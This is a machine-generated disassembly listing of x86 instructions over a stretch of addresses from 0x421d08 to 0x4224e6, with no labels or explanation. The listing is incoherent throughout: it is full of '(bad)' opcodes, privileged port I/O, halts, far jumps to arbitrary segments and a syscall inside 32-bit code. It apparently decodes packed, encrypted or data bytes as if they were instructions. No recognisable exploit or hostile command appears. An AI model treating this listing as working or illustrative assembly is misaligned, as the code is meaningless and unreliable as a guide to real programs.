  421d08:	jecxz  0x421d3b
  421d0a:	mov    dl,0x90
  421d0c:	pushf  
  421d0d:	bnd jmp 0x421d5d
  421d10:	mov    ?,esi
  421d12:	inc    esp
  421d13:	in     eax,0x0
  421d15:	add    ah,bh
  421d17:	mov    ch,0x28
  421d19:	or     eax,0x5f81efcd
  421d1e:	mov    al,0x3
  421d20:	cs push es
  421d22:	popa   
  421d23:	xor    DWORD PTR [edi+0x78],0xc1ab013c
  421d2a:	mov    bl,0x69
  421d2c:	lds    edi,FWORD PTR [ecx]
  421d2e:	hlt    
  421d2f:	mov    bh,0xc
  421d31:	popa   
  421d32:	add    BYTE PTR [eax],al
  421d34:	addr16 ret 
  421d36:	mov    al,0xa
  421d38:	mov    ecx,0x8cf514ad
  421d3d:	cmp    eax,0xc2390000
  421d42:	outs   dx,DWORD PTR ds:[esi]
  421d43:	aaa    
  421d44:	outs   dx,BYTE PTR ds:[esi]
  421d45:	lock ficomp WORD PTR [ecx+0x36]
  421d49:	cmp    DWORD PTR [ecx+0x814085],0x871ade00
  421d53:	sub    BYTE PTR [ecx-0x5b],al
  421d56:	and    al,0x84
  421d58:	rol    BYTE PTR [eax],0x0
  421d5b:	aas    
  421d5c:	in     al,0x3b
  421d5e:	or     BYTE PTR [esi-0x53cb0000],al
  421d64:	inc    edx
  421d65:	out    0xae,al
  421d67:	jmp    0x44cd:0x175fa477
  421d6e:	repz add BYTE PTR [eax],al
  421d71:	xchg   ebx,eax
  421d72:	dec    ecx
  421d73:	ja     0x421de5
  421d75:	retf   0x36e5
  421d78:	inc    edi
  421d79:	jmp    0x421dcb
  421d7b:	and    eax,0x8b63ce0a
  421d80:	xchg   esi,eax
  421d81:	rcl    eax,cl
  421d83:	sar    BYTE PTR [ebx],0x0
  421d86:	add    BYTE PTR [edx+0x2b],dl
  421d89:	popa   
  421d8a:	cmp    DWORD PTR [ebx],ebx
  421d8c:	pop    ss
  421d8d:	ror    DWORD PTR [ebx+eiz*8],1
  421d90:	add    BYTE PTR [eax],al
  421d92:	in     eax,0x2
  421d94:	xor    al,0xda
  421d96:	sbb    eax,0xbed8d3cb
  421d9b:	lock mov WORD PTR [ebx+0x5a430000],fs
  421da2:	(bad)  
  421da3:	lar    ecx,si
  421da6:	stos   DWORD PTR es:[edi],eax
  421da7:	je     0x421ded
  421da9:	bound  eax,QWORD PTR [eax]
  421dab:	add    dh,ch
  421dad:	pop    edi
  421dae:	mov    edi,0xecde5b63
  421db3:	imul   ebx,ecx,0x3e
  421db6:	inc    bh
  421db8:	mov    BYTE PTR [edi+0x0],ah
  421dbb:	add    dh,bh
  421dbd:	pop    es
  421dbe:	call   0x6a00:0x634c10
  421dc5:	lods   eax,DWORD PTR ds:[esi]
  421dc6:	addr16 and eax,0xa6e5cdd
  421dcc:	inc    esi
  421dcd:	arpl   WORD PTR [esi],sp
  421dcf:	xchg   ecx,eax
  421dd0:	mov    ebx,?
  421dd2:	add    BYTE PTR [eax],al
  421dd4:	dec    ebx
  421dd5:	jb     0x421d78
  421dd7:	fbstp  TBYTE PTR ds:0xc530e402
  421ddd:	iret   
  421dde:	cs mov cl,0x58
  421de1:	and    bh,BYTE PTR [bx+si+0x62]
  421de5:	daa    
  421de6:	fadd   DWORD PTR [ecx]
  421de8:	add    esp,DWORD PTR ds:[ecx+0x48]
  421dec:	add    BYTE PTR es:[eax],al
  421def:	jecxz  0x421e12
  421df1:	scas   eax,DWORD PTR es:[edi]
  421df2:	retf   0x3bf0
  421df5:	jae    0x421db3
  421df7:	xchg   edx,eax
  421df8:	fiadd  WORD PTR [ebx-0x5d]
  421dfb:	mov    eax,ds:0x9fbd077d
  421e00:	cmc    
  421e01:	add    eax,0x5e0c
  421e06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e07:	pop    ecx
  421e08:	push   0xffffff84
  421e0a:	jmp    0x421e0c
  421e0c:	add    BYTE PTR [esi-0x52b162a1],ch
  421e12:	(bad)  
  421e13:	jge    0x421e11
  421e15:	(bad)  
  421e16:	or     ebx,DWORD PTR [ebx-0x3e3b1597]
  421e1c:	add    BYTE PTR [eax],al
  421e1e:	out    dx,eax
  421e1f:	retf   0xa69a
  421e22:	sahf   
  421e23:	leave  
  421e24:	test   BYTE PTR [ecx+0x0],ch
  421e27:	add    ch,dh
  421e29:	xor    ebp,0x9e76e39
  421e2f:	or     DWORD PTR [edi],ebp
  421e31:	xchg   DWORD PTR [eax-0x2be9bc47],esp
  421e37:	imul   esp,DWORD PTR [ebx],0x4fe48382
  421e3d:	dec    ebp
  421e3e:	and    ebx,DWORD PTR [ebp+0x3a599f2d]
  421e44:	sbb    dh,bh
  421e46:	rol    BYTE PTR [eax+0x78],1
  421e49:	add    BYTE PTR [eax],al
  421e4b:	aas    
  421e4c:	inc    ebx
  421e4d:	rcr    BYTE PTR [edi+edi*2-0x7d],cl
  421e51:	test   DWORD PTR [edx-0x32],edx
  421e54:	jns    0x421ea7
  421e56:	push   esp
  421e57:	scas   eax,DWORD PTR es:[edi]
  421e58:	and    ebx,DWORD PTR [ecx+0x10]
  421e5b:	out    dx,eax
  421e5c:	in     al,0x35
  421e5e:	mov    bh,0x7b
  421e60:	push   ecx
  421e61:	and    al,0xc1
  421e63:	push   ebp
  421e64:	sub    DWORD PTR [ebp-0x44],ecx
  421e67:	jl     0x421e9c
  421e69:	push   es
  421e6a:	scas   eax,DWORD PTR es:[edi]
  421e6b:	cmp    BYTE PTR [ebp-0x76],bl
  421e6e:	ins    BYTE PTR es:[edi],dx
  421e6f:	scas   eax,DWORD PTR es:[edi]
  421e70:	mov    BYTE PTR [eax],0x3c
  421e73:	add    BYTE PTR [eax],al
  421e75:	enter  0x5,0x0
  421e79:	fsubr  QWORD PTR [ebp-0x1e727de1]
  421e7f:	jg     0x421e1c
  421e81:	imul   ebp,DWORD PTR [edi+edi*8],0xffffffb6
  421e85:	in     eax,dx
  421e86:	enter  0x1,0x0
  421e8a:	or     DWORD PTR [ebx+eax*1-0xa],edx
  421e8e:	(bad)  
  421e8f:	mov    bh,0xe2
  421e91:	jo     0x421e9a
  421e93:	nop
  421e94:	(bad)  [ecx+ebx*1]
  421e97:	add    BYTE PTR [eax],al
  421e99:	and    esp,edx
  421e9b:	mov    DWORD PTR [ecx],ecx
  421e9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e9e:	dec    ebp
  421e9f:	imul   eax,DWORD PTR [eiz*8+0x369a0000],0x35d06d8b
  421eaa:	adc    eax,DWORD PTR [esi-0x55ab0f32]
  421eb0:	xor    BYTE PTR [edi+0x36],al
  421eb3:	sub    DWORD PTR [eax+eax*4],ebx
  421eb6:	loope  0x421eb8
  421eb8:	add    bl,bh
  421eba:	mov    ds:0xe62a986e,al
  421ebf:	inc    ebp
  421ec0:	rol    bh,0x0
  421ec3:	add    BYTE PTR [edi],bl
  421ec5:	into   
  421ec6:	mov    edi,0xfc80163f
  421ecb:	add    BYTE PTR [eax],al
  421ecd:	je     0x421e7e
  421ecf:	(bad)  
  421ed0:	aam    0xd5
  421ed2:	or     BYTE PTR [edx+0x0],al
  421ed5:	add    BYTE PTR [esi-0x80],cl
  421ed8:	in     al,0x0
  421eda:	add    BYTE PTR [edx+0x0],cl
  421edd:	cmp    DWORD PTR [eax],eax
  421edf:	add    bh,dl
  421ee1:	sbb    ebx,DWORD PTR [eax-0x7a]
  421ee4:	aad    0xcb
  421ee6:	inc    ecx
  421ee7:	mov    bl,0xcf
  421ee9:	mov    ebx,0xb97d3fb4
  421eee:	mov    BYTE PTR [esi+0x48e50000],bh
  421ef4:	mov    ecx,0x1bba0000
  421ef9:	inc    esp
  421efa:	mov    edi,0xc0a0000
  421eff:	push   ebx
  421f00:	add    BYTE PTR [eax],al
  421f02:	int    0x64
  421f04:	mov    ds:0xf22ed362,al
  421f09:	cli    
  421f0a:	js     0x421f42
  421f0c:	hlt    
  421f0d:	jbe    0x421ee7
  421f0f:	pop    ebp
  421f10:	cdq    
  421f11:	lock pop ebp
  421f13:	lea    esp,[esi+0xad04b2]
  421f19:	add    BYTE PTR [ecx],ch
  421f1b:	mov    al,0x2d
  421f1d:	adc    esi,esp
  421f1f:	inc    ebx
  421f20:	dec    dl
  421f22:	add    edx,DWORD PTR [esp+edi*4+0x33c473f1]
  421f29:	add    BYTE PTR [eax],al
  421f2b:	adc    al,0x53
  421f2d:	pop    DWORD PTR [edx]
  421f2f:	aaa    
  421f30:	and    al,0xa6
  421f32:	push   0x19
  421f34:	cmp    eax,0xfede4178
  421f39:	adc    edi,DWORD PTR [edx]
  421f3b:	or     BYTE PTR ds:0x10910000,ch
  421f41:	add    BYTE PTR [ecx+0x6ba20000],ch
  421f47:	test   BYTE PTR [ecx+edx*8+0x0],0x0
  421f4c:	cmp    al,BYTE PTR [ecx+ebx*8+0x0]
  421f50:	add    BYTE PTR [ecx+0x12fe4172],dh
  421f56:	add    bh,BYTE PTR [ecx]
  421f58:	adc    bh,dl
  421f5a:	mov    eax,0x101e555c
  421f5f:	jnp    0x421fa0
  421f61:	push   edi
  421f62:	jo     0x421f45
  421f64:	call   0xf015:0xb329fc6f
  421f6b:	or     al,0x27
  421f6d:	add    BYTE PTR [eax],al
  421f6f:	xchg   ecx,eax
  421f70:	ja     0x421fe4
  421f72:	aam    0xb8
  421f74:	cld    
  421f75:	popa   
  421f76:	pop    edi
  421f77:	aad    0x2f
  421f79:	ja     0x421f6d
  421f7b:	sbb    al,0x33
  421f7d:	jne    0x421f6b
  421f7f:	push   ds
  421f80:	jmp    0x1bda7132
  421f85:	jns    0x421fb9
  421f87:	pop    eax
  421f88:	jg     0x421fbe
  421f8a:	rcl    esi,cl
  421f8c:	int    0x17
  421f8e:	ins    BYTE PTR es:[edi],dx
  421f8f:	rcr    BYTE PTR [edi+0x52],1
  421f92:	test   DWORD PTR es:[ebx],eax
  421f95:	outs   dx,BYTE PTR ds:[esi]
  421f96:	add    DWORD PTR [edx+0x172cd5b2],0xc46ea27b
  421fa0:	enter  0x0,0xa9
  421fa4:	fsub   QWORD PTR [edi+0x5ac6eca1]
  421faa:	cmc    
  421fab:	adc    DWORD PTR [ebx-0x53],ecx
  421fae:	mov    ebx,0x2eeace11
  421fb3:	popa   
  421fb4:	dec    ebp
  421fb5:	push   ss
  421fb6:	dec    ecx
  421fb7:	fs stc 
  421fb9:	lods   eax,DWORD PTR ds:[esi]
  421fba:	cmp    ebx,esi
  421fbc:	fsub   st(7),st
  421fbe:	cwde   
  421fbf:	jge    0x421f5a
  421fc1:	and    ebp,DWORD PTR [esi+0x3b48a94b]
  421fc7:	add    BYTE PTR [eax],al
  421fc9:	lock mov ds:0x43719ccd,eax
  421fcf:	and    BYTE PTR [esi-0x6f304388],0x38
  421fd6:	mov    bh,0x1a
  421fd8:	mov    eax,ds:0x10884f
  421fdd:	add    BYTE PTR [edi-0x16],dl
  421fe0:	sub    ecx,DWORD PTR [ebx+0x6151de37]
  421fe6:	ds xchg edi,eax
  421fe8:	mov    ds:0xc7651cb,al
  421fed:	dec    eax
  421fee:	add    BYTE PTR [eax],al
  421ff0:	sbb    ebx,DWORD PTR [ebx+0x4b]
  421ff3:	pop    ds
  421ff4:	sbb    eax,0x7db5769e
  421ff9:	aad    0x2d
  421ffb:	aas    
  421ffc:	and    BYTE PTR [ebx+0x41],ch
  421fff:	cmp    al,0x24
  422001:	(bad)  
  422002:	mov    bh,0xdb
  422004:	adc    BYTE PTR [edx+0x5aa382a1],dl
  42200a:	add    eax,0x13fee050
  42200f:	ss and ebx,ecx
  422012:	fbstp  TBYTE PTR [ebx+0x46]
  422015:	sbb    esp,DWORD PTR [eax-0x2a6a0142]
  42201b:	jno    0x421fc0
  42201d:	xchg   bl,cl
  42201f:	repz sbb al,al
  422022:	iret   
  422023:	add    BYTE PTR [eax],al
  422025:	dec    ebx
  422026:	repnz push edi
  422028:	daa    
  422029:	or     edx,DWORD PTR [edi]
  42202b:	out    0x69,eax
  42202d:	push   edi
  42202e:	adc    al,0x78
  422030:	sbb    al,0x88
  422032:	lea    eax,[eax]
  422034:	add    BYTE PTR [ebx-0x1b],al
  422037:	in     al,dx
  422038:	jne    0x422014
  42203a:	ins    BYTE PTR es:[edi],dx
  42203b:	or     BYTE PTR [esi-0x4e180000],dh
  422041:	mov    ebx,0x60f9f5e7
  422046:	lods   al,BYTE PTR ds:[esi]
  422047:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422049:	push   ecx
  42204a:	ret    0x40c1
  42204d:	jle    0x42204f
  42204f:	add    bh,ch
  422051:	rol    ebp,1
  422053:	outs   dx,BYTE PTR ds:[esi]
  422054:	cmp    DWORD PTR [edx],esp
  422056:	int    0x92
  422058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422059:	retf   
  42205a:	outs   dx,DWORD PTR ds:[esi]
  42205b:	mov    ebp,0x6f9c2a71
  422060:	dec    esi
  422061:	pushf  
  422062:	add    eax,0xc1de7aac
  422067:	sbb    eax,DWORD PTR [eax+ecx*2+0x0]
  42206b:	add    BYTE PTR [edi],dl
  42206d:	xchg   edx,eax
  42206e:	push   ecx
  42206f:	xchg   esi,eax
  422070:	xchg   esp,eax
  422071:	pusha  
  422072:	xchg   ebp,eax
  422073:	pop    esp
  422074:	dec    ebp
  422075:	xchg   edi,eax
  422076:	int    0x64
  422078:	push   ecx
  422079:	xor    BYTE PTR [ebp+0x33],ch
  42207c:	or     eax,0x3b5970ca
  422081:	test   DWORD PTR [edx],edx
  422083:	or     al,0xca
  422085:	add    BYTE PTR [eax],al
  422087:	lock call 0xeaa88d2c
  42208d:	out    0xeb,al
  42208f:	scas   al,BYTE PTR es:[edi]
  422090:	pop    ss
  422091:	stos   DWORD PTR es:[edi],eax
  422092:	push   ds
  422093:	push   0xffffffb0
  422095:	ss bnd jbe 0x422053
  422099:	pop    esi
  42209a:	mov    ebp,0x9d8c7a17
  42209f:	add    BYTE PTR [eax],al
  4220a1:	sti    
  4220a2:	mov    ecx,0x44724f1d
  4220a7:	repnz add BYTE PTR [eax],al
  4220aa:	test   eax,0xf60dd5b
  4220af:	pop    es
  4220b0:	push   eax
  4220b1:	add    eax,0x441e9c09
  4220b6:	dec    esp
  4220b7:	add    BYTE PTR [eax],al
  4220b9:	dec    ebp
  4220ba:	sub    al,0x6a
  4220bc:	cmp    eax,0x9b7d3d9f
  4220c1:	out    dx,eax
  4220c2:	aam    0x8e
  4220c4:	push   ebp
  4220c5:	test   esi,ebp
  4220c7:	sbb    eax,0x5e88ca70
  4220cc:	add    BYTE PTR [eax],al
  4220ce:	mov    BYTE PTR [eax+ecx*2+0x0],0x0
  4220d3:	mov    ah,0xcc
  4220d5:	cmp    BYTE PTR [eax],al
  4220d7:	add    BYTE PTR [esi-0x27],dl
  4220da:	mov    DWORD PTR [eax-0x698903b7],edx
  4220e0:	fild   QWORD PTR [esi-0x4d]
  4220e3:	push   edi
  4220e4:	xor    DWORD PTR [ebx+0x26],ebx
  4220e7:	jne    0x42214f
  4220e9:	cld    
  4220ea:	dec    edi
  4220eb:	fadd   DWORD PTR [edx-0x5b]
  4220ee:	mov    ds:0x640256f0,al
  4220f3:	aam    0x6f
  4220f5:	xor    DWORD PTR [esi+0xaebac6a],0xd68cda
  4220ff:	add    BYTE PTR [ecx-0x79],ch
  422102:	xor    DWORD PTR [eax+esi*2+0x0],eax
  422106:	add    BYTE PTR [eax-0x1fffff1c],al
  42210c:	and    cl,BYTE PTR [ebx-0x34]
  42210f:	mov    edx,0x4eae0000
  422114:	and    BYTE PTR [eax+0x28],dl
  422117:	jecxz  0x4220f2
  422119:	shl    BYTE PTR [esi+0x0],0x0
  42211d:	ret    0xeb6e
  422120:	fbld   TBYTE PTR [edx-0x3]
  422123:	sbb    edi,DWORD PTR [edi+0x43399b85]
  422129:	xor    eax,0x22096fcb
  42212e:	sbb    dh,BYTE PTR [ecx-0xfc6c4d3]
  422134:	push   eax
  422135:	nop
  422136:	cmp    al,0x50
  422138:	inc    edx
  422139:	push   esp
  42213a:	push   ebp
  42213b:	into   
  42213c:	cmp    al,0x8a
  42213e:	mov    al,ds:0x42f22a68
  422143:	stos   DWORD PTR es:[edi],eax
  422144:	jge    0x422158
  422146:	call   0x1e7f:0xefe02ac1
  42214d:	xor    DWORD PTR [ebx+0x380d3330],ecx
  422153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422154:	imul   ecx,DWORD PTR [edx+0x6e1769a4],0xffffffd6
  42215b:	add    bl,BYTE PTR [ebp+0xb27bbb2]
  422161:	and    DWORD PTR [ebp+0x2f],ecx
  422164:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422165:	cmc    
  422166:	cmp    al,0xff
  422168:	xor    eax,0x1e0b5f94
  42216d:	adc    DWORD PTR [eax],0x670872b0
  422173:	add    BYTE PTR [eax],al
  422175:	inc    ecx
  422176:	mov    al,0x61
  422178:	clc    
  422179:	retf   
  42217a:	cmc    
  42217b:	push   0x2653e0b6
  422180:	sbb    DWORD PTR [ebx-0x4ce5c482],esi
  422186:	dec    eax
  422187:	mov    DWORD PTR [eax],eax
  422189:	add    BYTE PTR [ebx],bl
  42218b:	fdiv   DWORD PTR [ebp-0x56e0fa66]
  422191:	(bad)  
  422192:	aas    
  422193:	stos   BYTE PTR es:[edi],al
  422194:	les    esp,FWORD PTR [ecx+0x0]
  422197:	add    BYTE PTR [ecx],cl
  422199:	push   ebx
  42219a:	out    dx,al
  42219b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42219c:	lods   al,BYTE PTR ds:[esi]
  42219d:	pushf  
  42219e:	lock mov al,0xef
  4221a1:	out    0xd9,al
  4221a3:	daa    
  4221a4:	sar    DWORD PTR [edx],1
  4221a6:	jl     0x422143
  4221a8:	adc    BYTE PTR [ebx],al
  4221aa:	inc    edx
  4221ab:	js     0x42214f
  4221ad:	mov    bl,0xea
  4221af:	rcpps  xmm4,XMMWORD PTR [edi]
  4221b2:	(bad)  
  4221b3:	fld    DWORD PTR [eax]
  4221b5:	add    BYTE PTR [edi+0x1e853f7c],bl
  4221bb:	mov    cl,0x4a
  4221bd:	shl    BYTE PTR [ecx+0x6d],cl
  4221c0:	cs ret 0x7de9
  4221c4:	dec    edi
  4221c5:	and    DWORD PTR [ecx],edx
  4221c7:	jb     0x42221c
  4221c9:	mov    dl,0x77
  4221cb:	mov    DWORD PTR [ebp+0x29],ebx
  4221ce:	pop    edx
  4221cf:	mov    edi,0x9972215e
  4221d4:	xchg   esi,eax
  4221d5:	addr16 aad 0xd6
  4221d8:	push   edi
  4221d9:	les    edi,FWORD PTR [edx-0x4ef80000]
  4221df:	add    BYTE PTR [eax],al
  4221e1:	stc    
  4221e2:	push   0x2
  4221e4:	test   al,0x99
  4221e6:	cmp    ebx,edi
  4221e8:	mov    al,ds:0x1c5661ad
  4221ed:	les    eax,FWORD PTR [ebp+0x7dfd0000]
  4221f3:	es pop ebp
  4221f5:	mov    edx,DWORD PTR [edx-0x11]
  4221f8:	cmp    al,0x82
  4221fa:	and    BYTE PTR [edx+esi*4+0x78ffb5e3],bl
  422201:	out    dx,eax
  422202:	jmp    0x8742614d
  422207:	add    BYTE PTR [eax],al
  422209:	jl     0x422205
  42220b:	test   DWORD PTR [edi+0x6],ebp
  42220e:	pop    edi
  42220f:	out    0xe2,al
  422211:	fisubr WORD PTR [edx]
  422213:	test   eax,0xb77ef258
  422218:	lds    edi,FWORD PTR [bx+di-0x4c]
  42221c:	call   DWORD PTR [edi+0xfb48]
  422222:	mov    ah,0x67
  422224:	cli    
  422225:	pop    ebx
  422226:	xchg   esi,eax
  422227:	mov    esp,0x5c8d2352
  42222c:	inc    ecx
  42222d:	sub    eax,0x8520386f
  422232:	lock fidivr DWORD PTR ds:0xd972fc14
  422239:	and    DWORD PTR [esi-0x720f2bc4],0x9a182a4d
  422243:	adc    ah,BYTE PTR ds:0x4fe7cd71
  422249:	sbb    al,0xb2
  42224b:	pop    edi
  42224c:	(bad)  
  42224d:	(bad)  
  42224e:	xchg   edi,eax
  42224f:	cmp    ebx,edi
  422251:	adc    eax,0xf80ce1
  422256:	add    BYTE PTR [eax],bl
  422258:	pop    ss
  422259:	mov    WORD PTR [edi],ss
  42225b:	add    BYTE PTR [eax],al
  42225d:	cmc    
  42225e:	xchg   edx,eax
  42225f:	sbb    DWORD PTR [edx+0x5ae15a98],edi
  422265:	sbb    edx,DWORD PTR [edi+0x75]
  422268:	lods   al,BYTE PTR ds:[esi]
  422269:	retf   
  42226a:	mov    dl,BYTE PTR [edi-0x3401935c]
  422270:	add    eax,0x920cfd6
  422275:	mov    WORD PTR [esi+0x34110000],ds
  42227b:	sbb    eax,0x6230570e
  422280:	push   0x14506d5c
  422285:	fnstenv [eax]
  422287:	pop    ebx
  422288:	mov    ebp,0x657365f3
  42228d:	pop    ecx
  42228e:	addr16 arpl si,bx
  422291:	popf   
  422292:	fcomp  QWORD PTR [ebp+0x10]
  422295:	repnz mov bh,0x5a
  422298:	and    bh,BYTE PTR [edx+edi*1-0x1e]
  42229c:	neg    BYTE PTR [edi+0x26c4]
  4222a2:	call   0x181db8d
  4222a7:	xchg   ebp,eax
  4222a8:	fmul   DWORD PTR [edi+0x59]
  4222ab:	xor    DWORD PTR [esi+0x36],esi
  4222ae:	loop   0x42225a
  4222b0:	pop    ss
  4222b1:	or     eax,0x2545c9e4
  4222b6:	repz adc dl,0x8c
  4222ba:	adc    eax,0x87810000
  4222bf:	and    BYTE PTR [ecx-0x590c7d4d],ah
  4222c5:	fist   WORD PTR [ebp-0x55d4bade]
  4222cb:	pop    ebx
  4222cc:	inc    ebx
  4222cd:	push   cs
  4222ce:	and    BYTE PTR [esi],dl
  4222d0:	xchg   esp,eax
  4222d1:	stos   DWORD PTR es:[edi],eax
  4222d2:	outs   dx,BYTE PTR ds:[esi]
  4222d3:	(bad)  
  4222d4:	ja     0x4222d4
  4222d6:	sbb    BYTE PTR [ebp+0x3e],dh
  4222d9:	cmc    
  4222da:	not    BYTE PTR [ebx+0x6c54d3f6]
  4222e0:	cwde   
  4222e1:	sub    eax,0x8d512063
  4222e6:	push   ds
  4222e7:	push   cs
  4222e8:	pop    ebp
  4222e9:	sub    al,0xd
  4222eb:	lds    ebp,FWORD PTR [eax-0x607e2edb]
  4222f1:	das    
  4222f2:	ret    0xe17e
  4222f5:	jecxz  0x422321
  4222f7:	xor    bh,BYTE PTR [ebp+0xc08dad5]
  4222fd:	add    BYTE PTR [eax],al
  4222ff:	inc    ebx
  422300:	add    al,0xbd
  422302:	add    BYTE PTR [eax],al
  422304:	sbb    ebp,edi
  422306:	xor    eax,0x56cee20f
  42230b:	lock addr16 jne 0x4222cf
  42230f:	add    BYTE PTR es:[eax],al
  422312:	mov    WORD PTR [eax],ds
  422314:	add    BYTE PTR [eax],al
  422316:	jl     0x422333
  422318:	test   DWORD PTR [esi+ecx*4-0x8a5dd2e],edx
  42231f:	mov    ch,0x67
  422321:	int3   
  422322:	or     al,0x0
  422324:	add    BYTE PTR [esi+0x14],bl
  422327:	cwde   
  422328:	fdivr  QWORD PTR [eax]
  42232a:	data16 xlat BYTE PTR ds:[ebx]
  42232c:	das    
  42232d:	inc    esi
  42232e:	push   edx
  42232f:	and    DWORD PTR [esi],eax
  422331:	jecxz  0x422318
  422333:	adc    ebp,DWORD PTR [eax-0x32]
  422336:	dec    edx
  422337:	js     0x4222c0
  422339:	icebp  
  42233a:	mov    DWORD PTR [ebp-0x3a],edi
  42233d:	mov    dl,0xa5
  42233f:	or     ch,BYTE PTR [edx-0x51]
  422342:	dec    esi
  422343:	mov    al,0x2f
  422345:	call   0x3789:0x505d2a37
  42234c:	lea    dx,[edx+0x75]
  422350:	(bad)  
  422351:	int    0xfb
  422353:	jb     0x422337
  422355:	or     al,0xd4
  422357:	add    BYTE PTR [eax],al
  422359:	mov    eax,0x68f5dc49
  42235e:	jl     0x422396
  422360:	retf   0xb374
  422363:	push   edi
  422364:	jle    0x422328
  422366:	pop    ebp
  422367:	iret   
  422368:	jle    0x4223b8
  42236a:	jle    0x42237f
  42236c:	or     bl,dh
  42236e:	cdq    
  42236f:	call   0x60d1be4
  422374:	cs pop ebx
  422376:	fbld   TBYTE PTR [eax+0xa808a1]
  42237c:	add    BYTE PTR [eax-0x4babc109],bl
  422382:	aam    0xab
  422384:	ins    BYTE PTR es:[edi],dx
  422385:	cmp    DWORD PTR [ebx-0x54],ebx
  422388:	jecxz  0x42238b
  42238a:	or     al,0xe5
  42238c:	add    BYTE PTR [eax],al
  42238e:	xor    DWORD PTR [ecx-0x136c350c],ebp
  422394:	das    
  422395:	gs aaa 
  422397:	ja     0x4223dd
  422399:	pop    ebx
  42239a:	add    BYTE PTR [eax],al
  42239c:	jl     0x42232a
  42239e:	cmp    al,BYTE PTR [eax]
  4223a0:	add    cl,dh
  4223a2:	or     dh,ah
  4223a4:	xchg   esi,eax
  4223a5:	jmp    0x5ab02a6c
  4223aa:	cmp    al,0x82
  4223ac:	xor    eax,0xd87aad7e
  4223b1:	push   ebp
  4223b2:	pop    eax
  4223b3:	inc    edx
  4223b4:	mov    BYTE PTR [ebx],ah
  4223b6:	add    BYTE PTR [eax],al
  4223b8:	jmp    0x803:0x6298b236
  4223bf:	lock add BYTE PTR [eax],al
  4223c2:	push   ds
  4223c3:	and    ebx,DWORD PTR [ebp-0x73]
  4223c6:	adc    BYTE PTR [edx+eax*2-0x77],0x24
  4223cb:	dec    esp
  4223cc:	push   es
  4223cd:	add    BYTE PTR [eax],al
  4223cf:	push   edi
  4223d0:	in     eax,dx
  4223d1:	neg    BYTE PTR [ebx+0x36]
  4223d4:	push   esi
  4223d5:	or     dl,BYTE PTR [eax+0x634f695d]
  4223db:	or     esp,esi
  4223dd:	out    0x98,eax
  4223df:	lds    esi,FWORD PTR [edx+0x6]
  4223e2:	inc    ebx
  4223e3:	outs   dx,BYTE PTR ds:[esi]
  4223e4:	call   FWORD PTR [ebp+0x5]
  4223e7:	jle    0x4223d2
  4223e9:	gs cmp edx,edi
  4223ec:	fs mov edx,0x19c27d25
  4223f2:	mov    al,0x4d
  4223f4:	pop    ecx
  4223f5:	sub    al,0x7d
  4223f7:	mov    dl,dl
  4223f9:	push   ebp
  4223fa:	mov    al,0xe4
  4223fc:	push   esi
  4223fd:	retf   0x4e3
  422400:	sldt   WORD PTR [eax]
  422403:	sub    ecx,DWORD PTR [edi+0x59662a0d]
  422409:	xor    al,0x72
  42240b:	int3   
  42240c:	daa    
  42240d:	add    BYTE PTR [eax],al
  42240f:	cwde   
  422410:	imul   eax,edx,0xf6da5951
  422416:	sub    DWORD PTR [edx+edx*8],edi
  422419:	idiv   DWORD PTR [eax-0x6c78af1a]
  42241f:	fsub   st,st(2)
  422421:	fild   QWORD PTR [eax]
  422423:	sbb    al,0x1e
  422425:	outs   dx,DWORD PTR ds:[esi]
  422426:	adc    ecx,eax
  422428:	ja     0x4223ce
  42242a:	pop    esi
  42242b:	inc    ecx
  42242c:	bound  ecx,QWORD PTR ds:0x53a15a98
  422432:	push   ebx
  422433:	jp     0x4223f4
  422435:	or     al,0x3a
  422437:	add    BYTE PTR [eax],al
  422439:	jge    0x4224ab
  42243b:	mov    dh,0x49
  42243d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42243e:	(bad)  
  42243f:	xchg   ecx,eax
  422440:	mov    ebx,0x2f22284d
  422445:	aad    0xb4
  422447:	sub    dl,BYTE PTR [esi]
  422449:	scas   al,BYTE PTR es:[edi]
  42244a:	enter  0x52,0x0
  42244e:	lea    ecx,[ebp-0x65a7c9f2]
  422454:	repz mov cl,0x63
  422457:	sbb    BYTE PTR [esi],bl
  422459:	repnz int 0xbe
  42245c:	ss out dx,al
  42245e:	add    BYTE PTR [ecx+0x17],0x2f
  422462:	xor    edi,ecx
  422464:	jle    0x4224be
  422466:	adc    ebx,DWORD PTR [edx+ecx*4+0xd448d3]
  42246d:	add    BYTE PTR [ebx+0x1b71578d],bh
  422473:	cmp    DWORD PTR [ebp+0x307b1c64],esp
  422479:	ret    
  42247a:	lods   al,BYTE PTR ds:[esi]
  42247b:	mov    ds:0x8c6d7ffc,eax
  422480:	in     eax,0x0
  422482:	add    bl,cl
  422484:	sbb    BYTE PTR ds:0xcf74b575,dh
  42248a:	jl     0x422483
  42248c:	dec    eax
  42248d:	mov    eax,DWORD PTR [eax]
  42248f:	add    BYTE PTR [eax+ebp*4-0x7d230ebd],ch
  422496:	mov    ebp,0x66bbb21a
  42249b:	mov    eax,0x14079b93
  4224a0:	sti    
  4224a1:	xchg   esi,eax
  4224a2:	retf   0xf189
  4224a5:	cmp    dl,BYTE PTR [edi+0x4690b8cb]
  4224ab:	push   es
  4224ac:	inc    ebp
  4224ad:	mov    ecx,esp
  4224af:	lods   eax,DWORD PTR ds:[esi]
  4224b0:	xchg   BYTE PTR [ebp-0x3901a7ab],ch
  4224b6:	syscall 
  4224b8:	stos   BYTE PTR es:[edi],al
  4224b9:	inc    ebx
  4224ba:	fmul   DWORD PTR [ecx+0x40]
  4224bd:	popa   
  4224be:	add    BYTE PTR [eax],al
  4224c0:	mov    ch,0x38
  4224c2:	les    ecx,FWORD PTR [eax+0x0]
  4224c5:	add    BYTE PTR [eax+edx*1],dl
  4224c8:	gs sbb al,0xf7
  4224cb:	push   0x68f1139a
  4224d0:	xchg   BYTE PTR ds:0x9bb06816,ah
  4224d6:	and    ebp,esi
  4224d8:	cmp    eax,0x2d9b47
  4224dd:	inc    DWORD PTR [eax]
  4224df:	add    BYTE PTR [ecx+0x29c9c5dd],cl
  4224e5:	hlt    
  4224e6:	jecxz  0x4224bf
